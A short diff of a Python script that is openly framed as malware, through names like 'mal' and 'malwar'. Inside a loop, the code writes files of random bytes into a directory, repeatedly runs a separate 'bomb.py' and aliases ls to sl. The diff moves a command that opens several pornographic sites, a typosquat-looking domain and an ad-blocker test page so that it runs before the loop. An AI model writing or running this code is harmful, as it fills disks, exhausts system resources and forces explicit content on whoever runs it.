@@ -9,6 +9,7 @@ def forked():
   randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
   randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
   number = 1
+  os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
   while mal == True:
     random1 = random.choice(randomlet)
     random2 = random.choice(randonum)
@@ -21,7 +22,6 @@ def forked():
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
       file.write(malwar + str(random.randbytes(999)))
     os.system("python bomb.py")
-    os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
     os.system('alias ls="sl"') 
     os.system("clear")
     print(malwar)
